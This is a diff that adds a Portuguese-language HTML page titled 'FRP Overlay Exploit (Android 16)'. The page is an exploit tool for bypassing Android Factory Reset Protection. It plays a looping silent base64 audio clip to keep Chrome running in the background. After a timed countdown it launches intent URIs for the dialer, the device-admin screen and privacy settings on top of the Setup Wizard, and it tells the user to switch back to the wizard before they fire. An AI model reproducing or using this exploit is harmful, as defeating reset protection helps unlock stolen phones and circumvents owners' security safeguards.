@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FRP Overlay Exploit (Android 16)</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; padding: 20px; background-color: #121212; color: #ffffff; }
+        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; }
+        .btn-danger { background: #dc3545; }
+        #status { margin-top: 20px; font-weight: bold; color: #ffc107; text-align: center; }
+    </style>
+</head>
+<body>
+    <h2>🚀 BAL Bypass (Overlay)</h2>
+    <p>O Chrome vai usar um "Áudio Fantasma" para não congelar em segundo plano.</p>
+
+    <!-- Áudio silencioso em Base64 para manter o Chrome acordado em segundo plano -->
+    <audio id="wakelock" loop>
+        <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
+    </audio>
+
+    <!-- Payload 1: Forçar a abertura do Telefone para códigos USSD (*#*#4636#*#*) -->
+    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.DIAL;end')">
+        1. Injetar Marcador de Telefone (Dialer)
+    </button>
+
+    <!-- Payload 2: Forçar a tela de Adicionar Administrador (Bypass de UI) -->
+    <button class="btn" onclick="iniciarBomba('intent:#Intent;action=android.app.action.ADD_DEVICE_ADMIN;end')">
+        2. Injetar Tela de Administrador
+    </button>
+
+    <!-- Payload 3: Forçar abertura das configurações de Backup do Google diretamente -->
+    <button class="btn btn-danger" onclick="iniciarBomba('intent:#Intent;action=android.intent.action.PRIVACY_SETTINGS;end')">
+        3. Injetar Definições Críticas
+    </button>
+
+    <div id="status">Aguardando comando...</div>
+
+    <script>
+        function iniciarBomba(intentUri) {
+            // Toca o áudio invisível para forçar o Android a manter o Chrome rodando no fundo
+            let audio = document.getElementById('wakelock');
+            audio.play().catch(e => console.log("Erro de autoplay ignorado", e));
+
+            // Usa o relógio absoluto do sistema em vez de contar ciclos (evita atrasos)
+            let tempoAlvo = Date.now() + 10000; // Exatamente 10 segundos no futuro
+            const statusDiv = document.getElementById('status');
+            
+            const intervalo = setInterval(() => {
+                let tempoRestante = Math.ceil((tempoAlvo - Date.now()) / 1000);
+
+                if (tempoRestante > 0) {
+                    statusDiv.innerHTML = `⚠️ VOLTE PARA O SETUP WIZARD AGORA!<br>O Chrome vai injetar a tela em: ${tempoRestante}s`;
+                } else {
+                    clearInterval(intervalo);
+                    statusDiv.innerHTML = "💥 INJETANDO INTENT...";
+                    
+                    // Dispara o intent e pausa o áudio
+                    window.location.href = intentUri;
+                    audio.pause();
+                }
+            }, 200); // Verifica a cada 200ms para máxima precisão
+        }
+    </script>
+</body>
+</html>
